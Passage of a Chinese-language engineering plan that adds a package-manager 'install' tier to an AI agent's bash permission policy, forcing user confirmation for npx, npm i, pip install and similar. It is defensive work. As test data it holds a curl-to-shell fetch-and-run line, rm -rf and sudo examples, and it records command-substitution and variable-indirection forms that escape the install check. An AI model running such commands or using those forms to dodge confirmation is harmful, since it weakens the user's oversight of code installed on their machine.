---
phase: 47-bash
plan: 2
type: execute
wave: 2
depends_on: [47-01]
files_modified:
  - ai-bash-policy.js
  - ai-manager.js
  - tests/test-ai-bash-policy.js
autonomous: true
requirements: [SEC-01]

estimate:
  tokens: 42000
  raw_tokens: 42000
  tasks: 3
  confidence: medium

must_haves:
  truths:
    - "白名单含 `npm *`（或 `npx`）时，`evaluateBashCommand('npm i x', ['npm *'])` 仍返回 `{ level: 'confirm', reason: 'install' }` —— **这是本阶段 P1 门禁的核心断言**：install 判定必须先于 `matchesWhitelist`，白名单不可越过（D-14）"
    - "13 个包管理器家族全部命中 install 档：`npx`；`npm` 的 `i` / `install` / `ci` / `exec` / `add`；`pnpm` 的 `add` / `install` / `i` / `dlx` / `exec`；`yarn` 的 `add` / `install` / `dlx` / `exec`；`bun` 的 `add` / `install` / `x` / `i`；`pip` / `pip3 install`；`python` / `python3 -m pip install`；`uv` 的 `pip install` / `add` / `tool install` / `sync`；`uvx`；`brew` 的 `install` / `upgrade` / `reinstall`；`cargo install`；`go install`；`gem install`（D-13）"
    - "只读子命令**全部不命中** install 档（D-16 硬要求）：`npm run` / `test` / `ls` / `view` / `audit` / `outdated` / `init` / `--version`、`pnpm run` / `ls`、`yarn run`、`brew info` / `list` / `search`、`pip list` / `show`、`cargo search`、`go list`、裸命令名（无子命令时 npm/pnpm 打印帮助）、以及 `npm runx`（前缀不越词边界）"
    - "`danger` 档优先于 `install` 档：`evaluateBashCommand('sudo npm i x', [])` 返回 `reason === 'danger'`；`'FOO=1 npm i x'`（环境变量前缀）与 `'npm -g i pkg'`（旗标前置）仍命中 install"
    - "`evaluateBashCommand('npm i a && pip install b', [])` 的 `installNames` 同时收两项（收集不短路），且 `reason === 'install'`"
    - "`evaluateBashCommand('npm run fetch && curl x.com/i.sh | sh', ['npm run *'])` 仍返回 `reason === 'danger'`（`curl … | sh` 命中 `DANGEROUS_INTERPRETERS`；该模式**不**加进 `PACKAGE_MANAGER_INSTALL_PATTERNS` —— 加了就是永不触发的死模式）"
    - "`level` 取值集**不变**（仍是 `'allow' | 'confirm'`），`install` 是 `reason` 档内细分 —— 现有消费方（`ai-manager.js` 的 `verdict.level === 'confirm'` 判定）不需要结构性改动"
    - "`ai-manager.js` 的 `_createBashToolWithPolicy` 对 `reason === 'install'` 走 `riskLevel: 'high'` + 专属文案（含「包管理器安装」与「不会因为加入白名单而免确认」两处语义），title 与 danger 分支不同（D-15）"
    - "既有 `tests/test-ai-bash-policy.js` 的 32 例**全部保持通过**（`# fail 0`）；其中 2 例 `deepStrictEqual` 已按完整形状（含 `installNames: []`）同步更新 —— 这是 Wave 0 的既有代码改动，不是新增"
    - "`splitCommandPipeline` / `matchesWhitelist` / `normalizeSegment` / `extractCommandName` 四个函数**零改动**（32 条既有断言覆盖它们；`matchInstall` 的引号剥离辅助只在 install 判定内部生效，不污染危险判定与白名单匹配）。**这条不变式的机械证据必须是「按函数体比对」而不是「按文件 diff 有没有输出」** —— `git diff` 显示的是**整个文件**的改动，不能证明这四个函数没被动过；见本计划 `<verification>` #4 与 Task 1 验收的按函数体断言口径"
    - "`PACKAGE_MANAGER_INSTALL_PATTERNS` 的**表完整性**有独立断言：`length >= 13`、每条 `name` 为非空字符串、每条 `pattern` 可被 `new RegExp(pattern)` 成功构造（防止后续「精简」时删条目或写坏正则而测试仍绿）"
    - "`evaluateBashCommand` 在生产代码中的消费点经改动后复核：`grep -rn \"evaluateBashCommand\"` 的结果里，**生产代码只有 `ai-manager.js` 的一处调用**（`verdict.level` / `verdict.reason` / `verdict.dangerNames` 的使用集中在该调用点紧随的几行），其余命中全部是测试文件与 `docs/plan/ai-file-bash-tools-integration.md` 的**文档描述**（非代码消费）。这条复核结论写入 SUMMARY"
    - "`PACKAGE_MANAGER_INSTALL_PATTERNS` 的 JSDoc 含三处**代码内注释**（不只是计划文本）：① `npm ci` 为何计入安装档（不取新代码，但执行所有依赖的 `postinstall` 脚本 —— 实质是任意代码执行）；② `curl … | sh` 为何**不**收录（管道右侧的 `sh`／`bash` 已属 `DANGEROUS_INTERPRETERS`，`danger` 先返回，收录即永不触发的死模式）；③ 本表的**维护约定**（新增包管理器家族只需在数组里追加一条 `{ pattern, name }`）"
  artifacts:
    - "`ai-bash-policy.js`：新增常量 `PACKAGE_MANAGER_INSTALL_PATTERNS`（13 条 `{ pattern, name }`）、辅助函数 `stripLeadingQuotes()` 与 `matchInstall()`、`evaluateBashCommand` 新增 `installNames` 收集与 `install` 短路分支；`module.exports` 追加 `PACKAGE_MANAGER_INSTALL_PATTERNS` 与 `matchInstall`"
    - "`ai-bash-policy.js` 文件头 JSDoc 的三档说明补第三个触发源（`install`）"
    - "`ai-manager.js`：`_createBashToolWithPolicy` 的 bash 工具 description 第 3 句扩展为同时点名包管理器安装命令；`isInstall` 判定 + `dangerHint` / `title` 三分支 + `riskLevel: (isDanger || isInstall) ? 'high' : 'medium'`"
    - "`tests/test-ai-bash-policy.js`：新增两个 describe 分组（`matchInstall 包管理器安装判定`、`evaluateBashCommand install 档短路`）+ 同步更新 2 条既有 `deepStrictEqual`"
  key_links:
    - "`evaluateBashCommand` 流水线：`splitCommandPipeline` → 逐段 `matchDangerous` + `matchInstall` 收集 → **danger 先返回** → **install 短路（先于白名单）** → `matchesWhitelist` → 默认 confirm"
    - "`ai-manager.js:5647` 的 `verdict = bashPolicy.evaluateBashCommand(...)` → `verdict.reason === 'install'` → `requestActionConfirmation({ riskLevel: 'high', title: 'AI 请求安装第三方软件包' })` → 用户未确认则返回 `cancelled` 正常结果（不 throw）"
    - "`settings.aiBashWhitelist` 的语义被本计划改变：`npm` 不再能靠白名单免确认 → 47-04 必须同步 `docs/product/ai-agent-workspace.md` §五 的白名单使用建议与 `AGENTS.md` 的三档说明"
  prohibitions:
    - statement: "install 判定不得放在 `matchesWhitelist` 之后，也不得对 install 档豁免白名单检查（`reason === 'install'` 必须走 confirm 且 `riskLevel === 'high'`）"
      status: unresolved
      verification: judgment
      reason: "D-14 是本阶段最重要的业务逻辑不变式；PITFALLS P1 后果 1 的具体缺口就是「用户把 npx 加进白名单即永久免确认」"
    - statement: "`PACKAGE_MANAGER_INSTALL_PATTERNS` 不得把 `curl … | sh` 类「下载并管道执行」收录进去（`danger` 已先命中，收录即死模式）"
      status: unresolved
      verification: judgment
      reason: "管道右侧的 `sh`/`bash` 已属 `DANGEROUS_INTERPRETERS`，重复收录只会掩盖真实判据；该模式只保留在技能文本扫描器（47-01 Task 3）里"
    - statement: "不得把 `npm` / `yarn` / `pnpm` / `brew` 的裸命令名整族判为安装（不做子命令区分的实现会让 `npm run dev` / `npm test` 每次弹框，驱动用户把 `npm` 整个加白名单，反而一次放开安装档）"
      status: unresolved
      verification: judgment
      reason: "D-16 的判据就是「误伤会间接扩大白名单」；只读反例断言是这条不变式的机械防护"
    - statement: "不得把 install 档并入 `DANGEROUS_PATTERNS`（`reason` 必须保持 `'install'` 与 `'danger'` 分离），也不得把 `npx` / `uvx` 塞进 `DANGEROUS_INTERPRETERS`"
      status: unresolved
      verification: judgment
      reason: "D-14 要求语义分离（本机破坏 vs 网络取第三方代码）；并入后 `brew install wget` 与 `rm -rf` 在 UI 上无法区分，且 `DANGEROUS_INTERPRETERS` 表达不了子命令粒度"
    - statement: "不得改动 `splitCommandPipeline` / `matchesWhitelist` / `normalizeSegment` / `extractCommandName`（既有 32 条断言覆盖），也不得让引号剥离影响 `matchDangerous` 与白名单匹配"
      status: unresolved
      verification: judgment
      reason: "既有引擎的诚实边界（引号感知拆段、前缀语义）已由 32 条断言锁定；改口径会同时移动危险判定与白名单匹配的行为"
    - statement: "不得在 `PACKAGE_MANAGER_INSTALL_PATTERNS` 的模式中使用会误命中 `npm runx` 这类无边界的裸前缀（必须保持 `\\b` 词边界与子命令捕获组）"
      status: unresolved
      verification: judgment
      reason: "前缀不设词边界会让 `npm runx` / `brewx` 类命令误判，属 D-16 的误伤面"
---

<objective>
给 `ai-bash-policy.js` 补上第三个触发源：**包管理器安装档**。13 个包管理器家族的安装/包执行语义无论是否命中白名单，一律走强制确认卡片（`riskLevel: 'high'`）。

Purpose: 这是 P1（S1 阻断门禁）的第二半。只改写内置技能文本而不补安装档，用户把 `npx` 加进 `settings.aiBashWhitelist` 即可永久免确认（PITFALLS P1 后果 1 的具体缺口，`npx` 既不在 `DANGEROUS_INTERPRETERS` 也不匹配任何 `DANGEROUS_PATTERNS`）；只补安装档而不改写文本，则随包分发了一份「怎么装任意代码」的说明书。两半必须同阶段交付。

Output: `ai-bash-policy.js` 的 `PACKAGE_MANAGER_INSTALL_PATTERNS` + `matchInstall` + `evaluateBashCommand` 的 `install` 短路；`ai-manager.js` 的确认卡片三分支；`tests/test-ai-bash-policy.js` 的两个新 describe 分组 + 2 条既有断言的形状同步。
</objective>

<execution_context>
@$HOME/.codebuddy/gsd-core/workflows/execute-plan.md
@$HOME/.codebuddy/gsd-core/templates/summary.md
</execution_context>

<context>
@.planning/PROJECT.md
@.planning/ROADMAP.md
@.planning/STATE.md
@.planning/REQUIREMENTS.md
@.planning/phases/47-bash/47-CONTEXT.md
@.planning/phases/47-bash/47-RESEARCH.md
@.planning/phases/47-bash/47-PATTERNS.md
@.planning/phases/47-bash/47-VALIDATION.md

@ai-bash-policy.js
@ai-manager.js
@tests/test-ai-bash-policy.js
@tests/test-ai-skills.js
</context>

<artifacts_this_phase_produces>
本计划（47-02）新建的符号与命名，供 plan-review-convergence 的 source-grounding 排除新增符号误报：

**`ai-bash-policy.js` 新增导出**
- `PACKAGE_MANAGER_INSTALL_PATTERNS`（模块级常量，`{ pattern, name }` 数组，13 条）
- `matchInstall(seg)`（返回 `string | null`）

**`ai-bash-policy.js` 新增内部函数（不导出）**
- `stripLeadingQuotes(seg)`

**`evaluateBashCommand` 返回形状的新增字段**
- `installNames: string[]`（**所有分支**都带该字段 —— 选定完整形状路线（A），见 decision）

**`ai-manager.js` 新增局部符号**
- `isInstall`（`_createBashToolWithPolicy` 内的局部常量，非导出）

**新约定字符串**
- `reason` 取值新增 `'install'`（既有取值 `'danger'` / `'default'` / `'empty'` 不变）
- `level` 取值集**不变**（`'allow'` / `'confirm'`）
- 确认卡片 title 新增 `'AI 请求安装第三方软件包'`

**刻意不产出（decided omission，不是遗漏 —— source-grounding 请据此排除）**
- **不把 `curl … | sh` 加进 `PACKAGE_MANAGER_INSTALL_PATTERNS`** —— `danger` 已先命中（管道右侧 `sh` ∈ `DANGEROUS_INTERPRETERS`），收录即死模式。
- **不改 `splitCommandPipeline` / `matchesWhitelist` / `normalizeSegment` / `extractCommandName`** —— 32 条既有断言锁定其口径。
- **不把 `npx` / `uvx` 加进 `DANGEROUS_INTERPRETERS`** —— 该集合表达不了子命令粒度（`npm i` / `brew install` 会漏）。
- **不改 `ai-manager.js` 的确认取消链路与终态推送链路** —— `verdict.level === 'confirm'` 判定不变，`:5664-5689` 零改动。
- **不动 `docs/product/**` 与 `AGENTS.md`** —— 文档同步归 47-04（本计划只把「三档 vs 四档」的决策记在下方 decision 里，由 47-04 落地）。
</artifacts_this_phase_produces>

<decisions>
本计划需要在实施前拍板的两处（RESEARCH 的 Open Question 与 Pitfall 1）：

- **D-47-02-a（Pitfall 1 路线 A/B）：选完整形状路线 (A)。** `allow` 分支也返回 `installNames: []`，因此 `tests/test-ai-bash-policy.js:159-164` 的两条 `deepStrictEqual` 必须同步改为 `{ level: 'allow', dangerNames: [], installNames: [] }`。理由：Phase 48/49 的消费者拿到形状一致的对象，避免「有时有 `installNames` 有时没有」的隐式契约；代价是改 2 条既有断言（已实测，其余 30 条用 `strictEqual(verdict.reason, ...)` 或 `assert.ok(...includes(...))`，新增字段不触发）。
- **D-47-02-b（Open Question Q3）：保持「三档权限」框架，不改称四档。** 实现上 `level` 只有 `allow` / `confirm` 两个取值，`reason` 是档内细分，因此**确实是三档**；只把第三档（强制确认）描述为**有两个互不包含的触发源**：危险命令表（本机破坏）与包管理器安装表（网络取第三方代码）。理由：改称四档会牵连 `docs/product/ai-agent-workspace.md §四` 的**标题**（就是「bash：三档权限」）、`ai-skills.md §五` 与 Phase 46 的历史文档；改动面外溢而语义收益为零。**47-04 按此落地文档。**
</decisions>

<tasks>

<task type="tracer">
  <name>Task 1: install 档端到端纵切（模式表 → 短路 → 确认卡片 → 白名单不可越过）</name>
  <files>ai-bash-policy.js, ai-manager.js, tests/test-ai-bash-policy.js</files>
  <reversibility rating="costly">D-14：`install` 作为**独立 reason** 与 `danger` 平行但语义分离，且短路先于白名单。回退需同时改 `ai-bash-policy.js` 的裁决流水线、`ai-manager.js` 的三分支消费与两个新 describe 的 30+ 条断言，并会重新打开 PITFALLS P1 后果 1 的白名单缺口。</reversibility>
  <read_first>
    - ai-bash-policy.js（全文，263 行）：:1-13（文件头三档说明与「诚实边界」定位 —— **新表必须继承这套定位**）、:20-22（`normalizeSegment`）、:36-98（`splitCommandPipeline` 引号感知拆段 —— 只读不改）、:106-114（`extractCommandName` 跳过 `KEY=VALUE` 前缀 + basename —— 只读不改）、:127-150（`matchesWhitelist` 前缀语义 —— 只读不改）、:159-171（`DANGEROUS_PATTERNS` 的 `{ pattern, name }` 形状模板）、:177-180（`DANGEROUS_INTERPRETERS` 集合）、:182-198（`matchDangerous` —— `matchInstall` 的逐字模子）、:200-228（`evaluateBashCommand` —— install 短路的插入点）、:253-263（导出块）
    - ai-manager.js:5616-5691（`_createBashToolWithPolicy` 全文 —— 工具 description 第 3 句、`verdict` 消费、`isDanger` 二分、`requestActionConfirmation` 调用、取消链路、终态链路）
    - tests/test-ai-bash-policy.js（全文，222 行）：6 个 describe 的组织与行范围、:155-165（**会破裂的 2 条 `deepStrictEqual`**，逐字）、命名与断言风格（中文短句 + 逐字段 `strictEqual`）
    - tests/test-ai-skills.js:48-73（`readSource` / `methodBody` —— P1-b-4 的源码扫描辅助）
    - 47-RESEARCH.md §E-1（**已实测定型的 13 条模式表与 `matchInstall` 形态 —— 直接逐字照抄，不要重新设计正则**；含 33 正例 / 34 反例 / 15 逃逸向量的实测结论）、§E-2（插入点与四条硬约束）、§E-3（`ai-manager.js` 的三分改法逐字）、§E-4（新增用例清单）、§Pitfall 1（`installNames` 打破 2 条既有断言）、§Pitfall 8（`npm --prefix X i Y` 类旗标前置形态的覆盖）
    - 47-PATTERNS.md §1（`ai-bash-policy.js` 的逐字代码片段与「四条不动约束」）、§2（`ai-manager.js` 的四行三分改法）、§7（测试脚手架与 `methodBody` 用法）、Shared Patterns §E
    - 47-CONTEXT.md D-13 / D-14 / D-15 / D-16
  </read_first>
  <action>
    1. `ai-bash-policy.js`：在 `DANGEROUS_INTERPRETERS` 之后新增 `const PACKAGE_MANAGER_INSTALL_PATTERNS = [...]`，**逐字照抄 47-RESEARCH.md §E-1 的 13 条**（`{ pattern, name }`，与 `DANGEROUS_PATTERNS` 同形状）。JSDoc 必须写明五点（**全部是代码内注释，不是只写在计划里** —— 评审共识项 5 `L410@c4c58fe`）：① 本表是「从网络获取并执行第三方代码」的语义，与 `DANGEROUS_PATTERNS`（本机破坏性操作）平行但分离；② `curl … | sh` **不收录**（`DANGEROUS_INTERPRETERS` 已先命中，收录即死模式 —— 并写明「管道右侧 `sh` 已由危险解释器表承接」，防止后人「补上这个遗漏」）；③ 表内模式只做**子命令粒度**匹配，裸命令名（`npm` 无子命令）与只读子命令（`run` / `test` / `ls` / `view` / `audit` / `outdated` / `info` / `list` / `search` / `show`）刻意不命中；④ **`npm ci` 为何计入安装档**：它从 lockfile 恢复依赖、**不取新代码**，但**会执行所有依赖的 `postinstall` 脚本** —— 「不取新代码」不等于「不执行任意代码」，故计入（这条必须写在代码里，未来维护者一定会问为什么它和 `npm run` 待遇不同）；⑤ **本表的维护约定**：新增包管理器家族只需在数组里追加一条 `{ pattern, name }`，不需要改 `evaluateBashCommand` 的流水线结构（避免后人误以为要动引擎）。
    2. `ai-bash-policy.js`：新增 `stripLeadingQuotes(seg)`（`normalizeSegment(seg).replace(/^(['"])([A-Za-z][\w.-]*)\1/, '$2')`）与 `matchInstall(seg)`（照 `matchDangerous` 的模子：同 normalize 口径、同 `string | null` 返回、同 for-of 早返回）。**`stripLeadingQuotes` 必须带一行注释说明用途与边界**：它覆盖 `'npm' i x` / `"npm" install x` 这类**用 shell 引号包裹命令名**的形态（不做剥离则 `\bnpm\b` 不匹配、安装档漏检）；**引号剥离只用在 `matchInstall` 内部**，不污染 `matchDangerous` / `matchesWhitelist`（后两者的口径由既有 32 条断言锁定）—— 这句注释是防后人「顺手把它提到 `normalizeSegment` 层做统一处理」的护栏，那会同时移动危险判定与白名单匹配的行为。
    3. `ai-bash-policy.js`：`evaluateBashCommand` 改为在同一个 `for (const seg of segments)` 循环里同时收集 `dangerNames` 与 `installNames`（**收集不短路**），然后按固定顺序返回：
       - `dangerNames.length > 0` → `{ level: 'confirm', reason: 'danger', dangerNames, installNames }`（**danger 先返回**：`sudo npm i x` 是 danger）
       - `installNames.length > 0` → `{ level: 'confirm', reason: 'install', dangerNames, installNames }`（**先于 `matchesWhitelist`** —— 白名单不可越过）
       - 其余分支（`empty` / `allow` / `default`）**一律带上 `installNames`**（完整形状路线 A，见 decision D-47-02-a）
    4. `ai-bash-policy.js`：文件头 JSDoc（:1-13）的三档说明补第三个触发源 —— 第三档「confirm / 强制确认」的两个触发源为 `DANGEROUS_PATTERNS`+`DANGEROUS_INTERPRETERS`（reason `danger`）与 `PACKAGE_MANAGER_INSTALL_PATTERNS`（reason `install`），**两者命中即白名单失效**。既有「诚实边界」段落**一字不动**（它对本档同样成立）。
    5. `ai-bash-policy.js`：`module.exports`（:253-263）在 `DANGEROUS_PATTERNS` / `DANGEROUS_INTERPRETERS` 之后追加 `PACKAGE_MANAGER_INSTALL_PATTERNS,` 与 `matchInstall,`。
    6. `ai-manager.js` 的 `_createBashToolWithPolicy`：
       - 工具 description（:5636-5638）第 3 句改为同时点名两类：`'危险命令（rm/sudo/kill 等）与包管理器安装命令（npx/npm i/pip install/brew install 等）即使加入白名单也必须确认。'`
       - `verdict` 消费处（:5651 附近）新增 `const isInstall = verdict.reason === 'install';`
       - `dangerHint` 三分支：`isDanger` → 既有 `检测到高危操作（…），白名单对本命令无效`；`isInstall` → `检测到包管理器安装（${verdict.installNames.join('、')}）：将从网络下载并运行第三方代码；该命令不会因为加入白名单而免确认`；否则 → 既有 `该命令未命中白名单`。
       - `title` 三分支：`isDanger` → `'AI 请求执行高危 Bash 命令'`；`isInstall` → **`'AI 请求安装第三方软件包'`**；否则 → 既有 `'AI 请求执行 Bash 命令'`。
       - `riskLevel: (isDanger || isInstall) ? 'high' : 'medium'`（D-15：install 与 danger 同级）。
       - **取消链路（:5664-5674）与执行/终态链路（:5676-5689）零改动**；`timeoutMs: 120000` 保持。
    7. `tests/test-ai-bash-policy.js`：把 :159-164 的两条 `assert.deepStrictEqual` 的目标对象补成 `{ level: 'allow', dangerNames: [], installNames: [] }`（完整形状路线 A）。**只改这两条的目标对象字面量，不改断言意图与用例名。**
    8. `tests/test-ai-bash-policy.js`：新增 `describe('matchInstall 包管理器安装判定（SEC-01 / D-13 / D-16）')`，逐条覆盖 47-RESEARCH.md §E-4 的正例与反例清单：
       - **必命中（≥13 族各 1 条 + 形态变体）**：`npx create-app`、`npm i x`、`npm install`、`npm ci`、`npm exec x`、`npm add x`、`pnpm add x`、`pnpm dlx x`、`yarn add x`、`yarn dlx x`、`bun add x`、`bun x foo`、`pip install x`、`pip3 install x`、`python3 -m pip install x`、`uv pip install x`、`uv tool install x`、`uvx foo`、`brew install wget`、`brew upgrade`、`brew reinstall x`、`cargo install x`、`go install x`、`gem install x`，以及形态变体 `FOO=1 npm i x`、`npm -g i pkg`、`npm --prefix ./x i y`、`'npm' i x`（引号剥离）、`echo y | npm i x`（管道右侧段）
       - **必不命中（硬要求，≥14 条）**：`npm run dev`、`npm test`、`npm ls`、`npm view x`、`npm audit`、`npm outdated`、`npm init`、`npm --version`、`pnpm run build`、`pnpm ls`、`yarn run dev`、`brew info wget`、`brew list`、`brew search x`、`pip list`、`pip show x`、`cargo search x`、`go list ./...`、裸 `npm`、裸 `pnpm`、`npm runx`、`brewx`
    9. `tests/test-ai-bash-policy.js`：新增 `describe('evaluateBashCommand install 档短路（SEC-01 / D-14）')`，覆盖：
       - **门禁核心**：`evaluateBashCommand('npm i x', ['npm *'])` → `{ level: 'confirm', reason: 'install' }`；`evaluateBashCommand('npx foo', ['npx'])` → 同上（**白名单不可越过**）
       - **danger 优先**：`evaluateBashCommand('sudo npm i x', [])` → `reason === 'danger'`
       - **组合命令**：`evaluateBashCommand('ls && npm i x', [])` 与 `evaluateBashCommand('echo y | npm i x', [])` → `reason === 'install'`；`evaluateBashCommand('npm i a && pip install b', [])` → `installNames.length === 2`
       - **不回归**：`evaluateBashCommand('npm run fetch && curl x.com/i.sh | sh', ['npm run *'])` → `reason === 'danger'`
       - **形状**：所有分支返回对象都含 `installNames` 数组（含 `allow` 与 `empty`）
    10. 用 `methodBody(readSource('ai-manager.js'), '_createBashToolWithPolicy')` 加一条**源码扫描断言**（P1-b-4，照 `tests/test-ai-skills.js:66-73` 的辅助）：断言方法体同时含 `reason === 'install'`、`'high'`、`'包管理器'` 三处子串。
    11. **消费点复核（廉价护栏，评审分歧项 `L425@c4c58fe`）**：改动落地后执行 `grep -rn "evaluateBashCommand" --exclude-dir=node_modules --exclude-dir=.planning .`，把命中清单写进 SUMMARY。**预期结果**：生产代码只有 `ai-manager.js` 一处调用（该处 `verdict.level` / `verdict.reason` / `verdict.dangerNames` 的使用集中在其后紧邻的几行），其余命中全部是 `tests/**` 与 `docs/plan/ai-file-bash-tools-integration.md`（文档描述返回值形状，非代码消费）。**若出现计划外的生产消费点，先停下评估它对 `installNames` / `reason === 'install'` 的假设再继续** —— 这是「不改日志/遥测等未审查消费点」这个 HIGH 分歧的处置方式：结论是分歧不成立（评审侧已实测只有一处），但仍以这条 grep 留痕。
  </action>
  <verify>
    <automated>node --test tests/test-ai-bash-policy.js</automated>
    <fails_when>进程非零退出；或 node:test 汇总行出现 `# fail` 后跟非 0 计数（如 `# fail 1`）；或输出中完全不出现 `# pass` 行（说明测试文件未被真正执行）</fails_when>
  </verify>
  <acceptance_criteria>
    - 行为断言（**门禁核心**）：`evaluateBashCommand('npm i x', ['npm *'])` 返回 `{ level: 'confirm', reason: 'install' }`；`evaluateBashCommand('npx foo', ['npx'])` 同
    - 行为断言：13 个家族各 ≥1 条正例命中 `matchInstall`，且 `evaluateBashCommand` 对它们返回 `reason === 'install'`
    - 行为断言：≥14 条只读子命令全部**不命中** install 档（`npm run dev` / `npm test` / `brew info` / `pip list` / 裸 `npm` / `npm runx` 等），且它们仍按既有白名单语义返回 `allow` 或 `default`
    - 行为断言：`evaluateBashCommand('sudo npm i x', [])` 返回 `reason === 'danger'`（danger 优先于 install）
    - 行为断言：`evaluateBashCommand('npm i a && pip install b', [])` 的 `installNames` 长度为 2
    - 行为断言：既有 32 例保持通过（`# fail 0`），其中 2 条 `deepStrictEqual` 已按 `installNames: []` 同步
    - 源码断言：`ai-bash-policy.js` 的 `evaluateBashCommand` 函数体中，`installNames.length > 0` 的返回语句**出现在** `matchesWhitelist` 调用之前（用 `readSource` + `indexOf` 断言行序）
    - 源码断言：`ai-bash-policy.js` 中不出现 `'curl … | sh'` 的 install 模式（`PACKAGE_MANAGER_INSTALL_PATTERNS` 表内无 `curl` / `wget` 条目）
    - 源码断言（**按函数体比对，不是「文件 diff 有没有输出」**）：`splitCommandPipeline` / `matchesWhitelist` / `normalizeSegment` / `extractCommandName` 四个函数体与本计划开始前逐字相同。取基线 `BASE=$(cat "$(git rev-parse --git-dir)/gsd-plan-head-before-47-02")`，**先守卫空基线**（`test -n "$BASE" || { echo "plan-head 台账未解析（基线为空）—— 判据不得以空基线求值"; exit 1; }`），然后：① `git diff -U0 "$BASE"..HEAD -- ai-bash-policy.js` 的**变更行号区间集合**与四个函数体在**基线版本**（`git show "$BASE:ai-bash-policy.js"`）中占据的行号区间**零交集**；② 变更区间全部落在文件头 JSDoc / `PACKAGE_MANAGER_INSTALL_PATTERNS` / `stripLeadingQuotes` / `matchInstall` / `evaluateBashCommand` / `module.exports` 六处之内。**不要用裸 `git diff`**：对已提交的改动它不产生输出，判据会空转；也不要只看 `git diff --stat` —— 它只能证明「文件变了」，不能证明「这四个人没被碰」
    - 行为断言（**表完整性**）：`PACKAGE_MANAGER_INSTALL_PATTERNS.length >= 13`，每条 `name` 是非空字符串，且每条 `pattern` 能被 `new RegExp(pattern)` 成功构造
    - 同步记录（**消费点复核**）：SUMMARY 含 `grep -rn "evaluateBashCommand"` 的命中清单，且生产代码命中数 == 1（`ai-manager.js` 的那一处调用）
    - 源码断言：`stripLeadingQuotes` 带一行注释说明用途（覆盖引号包裹命令名）与边界（只在 `matchInstall` 内使用）
    - 源码断言：`PACKAGE_MANAGER_INSTALL_PATTERNS` 的 JSDoc 含 `npm ci` 的 `postinstall` 理由与「新增家族只需追加 `{ pattern, name }`」的维护约定
    - 源码断言：`methodBody(readSource('ai-manager.js'), '_createBashToolWithPolicy')` 同时含 `reason === 'install'`、`'high'`、`'包管理器'`
    - 行为断言：`node --check ai-bash-policy.js && node --check ai-manager.js` 均退出 0
  </acceptance_criteria>
  <done>包管理器安装命令再也无法借白名单绕过确认：`npx` / `npm i|install|ci|exec|add` / `pnpm·yarn·bun` 的 add·dlx·install / `pip` / `uv`·`uvx` / `brew install|upgrade` / `cargo`·`go`·`gem install` 一律弹出 `riskLevel: 'high'` 的专属确认卡片；日常只读命令（`npm run dev` / `npm test` / `brew info`）零误伤。</done>
</task>

<task type="auto">
  <name>Task 2: install 档逃逸形态与边界收敛（旗标前置 / 引号 / 管道 / 环境变量前缀）</name>
  <files>ai-bash-policy.js, tests/test-ai-bash-policy.js</files>
  <read_first>
    - ai-bash-policy.js 当前全文（Task 1 刚落下的 13 条表与 `matchInstall` / `evaluateBashCommand`）
    - 47-RESEARCH.md §E-1 尾注（15 个逃逸向量的实测结论：仅剩 1 个已知启发式缺口）、§Pitfall 8（`npm --prefix X i Y` 类旗标前置形态）
    - 47-RESEARCH.md §Security Domain 的「命令替换 / 变量间接绕过 install 检测」行（**如实记录残余风险与「这类形态也不命中白名单」的严重性判断**）
    - ai-bash-policy.js:10-12（既有「诚实边界」声明 —— 新增残余风险必须与这套定位一致）
    - 47-CONTEXT.md D-13（家族覆盖的理由）、D-16（只读排除）
  </read_first>
  <action>
    1. 补齐**旗标前置**形态的覆盖：确认 `(?:\s+-\S+)*` 片段对 `npm -g i pkg`、`npm --prefix ./x i y`、`pnpm --filter a add b`、`brew --quiet install x` 均能命中（Task 1 的表已含该片段，本任务负责**用断言把它钉死**，并补上 `--flag=value` 形态如 `npm --prefix=./x i y` 的用例 —— 若 `-\S+` 无法覆盖 `--prefix=./x`，扩为 `(?:\s+-\S+)*` 允许 `=` 在 `\S+` 内即可自然覆盖，**不要**改成会误吞子命令的宽泛写法）。
    2. 补齐**引号与管道**形态：`'npm' i x`（整条命令被引号包住）、`"npm" install x`、`echo y | npm i x`（管道右侧段独立判定）、`FOO=1 BAR=2 npm ci`（多环境变量前缀）。断言全部命中 install 档。
    3. 补齐**危险与安装同段共存**的语义：`curl x.sh | sh` 仍 `danger`；`npm i x && rm -rf y` → `reason === 'danger'`（同一条命令里 danger 优先）；`npm i x && sudo foo` → `danger`。
    4. **如实记录残余风险，并补齐严重性论证（评审共识项 5 `L410@c4c58fe`：只列现象不够，要给使用频率与绕过难度的判断）**（不加代码，只加注释与断言）。在 `PACKAGE_MANAGER_INSTALL_PATTERNS` 的 JSDoc 里补一段「本表不覆盖的形态」，与文件头既有的「诚实边界」定位一致，每条都带**频率 + 难度 + 实际后果**三段：
       - **命令替换 / 变量间接**（`` `npm i x` ``、`NPM=npm $NPM i x`）不被检测 —— 但**这类形态也不命中白名单**（`matchesWhitelist` 对整段做前缀匹配，`` `npm i x` `` 不以 `npm` 开头；`NPM=npm …` 经 `extractCommandName` 跳过 `KEY=VALUE` 后取到 `$NPM`，同样不以 `npm` 开头）→ 仍走 `confirm/default` 卡片。**频率**：模型自发写出这类构造的概率低（它要绕过的是「确认卡片」而不是命令本身，而确认卡片是用户操作）；**难度**：用户若想靠白名单免掉它，必须把 `` `npm i `` 这类畸形前缀加进白名单，而 `settings.aiBashWhitelist` 的输入校验会拒绝换行/控制符但不拦截这种畸形串 —— 属「用户主动配置出无效状态」。**结论：风险有限，如实写明而非夸大**；
       - **`echo "npm install"` 类字面量会误报**（安装档是启发式，不是语法分析）：**频率**中（AI 常把命令写进 `echo` / 注释 / 字符串）；**后果**是**多一次确认**而非漏放（fail-safe 方向正确，只是烦）；
       - 取值旗标形态之外的间接构造（如变量拼接）无法静态穷举：**难度**高、**频率**极低，且同样不命中白名单。
       并加一条**断言把「不命中白名单」这个事实钉死**：`matchesWhitelist('`npm i x`', ['npm *']) === false`（证明残余风险的严重性判断成立）；再加第二条：`evaluateBashCommand('`npm i x`', ['npm *']).reason !== 'install'` 但 `level === 'confirm'`（把「漏检 ≠ 免确认」这个结论也钉成机械证据）。
  </action>
  <verify>
    <automated>node --test tests/test-ai-bash-policy.js</automated>
    <fails_when>进程非零退出；或 node:test 汇总出现 `# fail` 非 0 计数；或旗标前置 / 引号 / 管道 / 环境变量前缀四组中任一条正例未命中 install 档</fails_when>
  </verify>
  <acceptance_criteria>
    - 行为断言：`npm -g i pkg`、`npm --prefix ./x i y`、`npm --prefix=./x i y`、`pnpm --filter a add b`、`brew --quiet install x` 全部命中 install 档
    - 行为断言：`'npm' i x`、`"npm" install x`、`FOO=1 BAR=2 npm ci`、`echo y | npm i x` 全部命中 install 档
